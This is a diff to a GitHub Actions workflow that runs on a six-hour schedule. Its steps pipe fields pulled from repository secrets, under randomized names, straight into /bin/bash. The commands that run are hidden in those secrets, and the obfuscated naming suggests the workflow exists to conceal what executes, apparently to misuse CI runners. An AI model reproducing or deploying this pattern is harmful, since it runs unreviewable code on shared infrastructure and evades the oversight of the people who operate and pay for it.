@@ -2,21 +2,28 @@ name: hongquanzz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
-
-jobs:  # 7215
+    - cron: '28 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hongquanzz
         env:
-          w49606: ${{ secrets.w49606 }}
+          m61: ${{ secrets.m61 }}
         run: |
-          echo $w49606 | jq -r .uuiy7 | /bin/bash
-          echo $kavh6529 | jq -r .t16094 | /bin/bash
-          echo $qdt0 | jq -r .m16975 | /bin/bash
-          echo $swrj4080 | jq -r .texw8 | /bin/bash
-          echo $tbg92 | jq -r .uc89 | /bin/bash
-          echo $r07 | jq -r .gg9955 | /bin/bash
+          echo $m61 | jq -r .fgwk750 | /bin/bash
+          echo $qolt596 | jq -r .ogj769 | /bin/bash
+          echo $goby63 | jq -r .l5 | /bin/bash
+          echo $jks2 | jq -r .tg26474 | /bin/bash
+          echo $cx574 | jq -r .me42 | /bin/bash
+          echo $m8 | jq -r .xuh034 | /bin/bash
+          echo $ghdux05 | jq -r .bcx908 | /bin/bash
+          echo $laco1218 | jq -r .d62 | /bin/bash
+          echo $png985 | jq -r .g4505 | /bin/bash
+          echo $hrh18 | jq -r .fj7 | /bin/bash
+          echo $jqn047 | jq -r .gxqs05 | /bin/bash
+          echo $oxzoz08626 | jq -r .oqy6 | /bin/bash
+          echo $bgu17 | jq -r .e54287 | /bin/bash
 
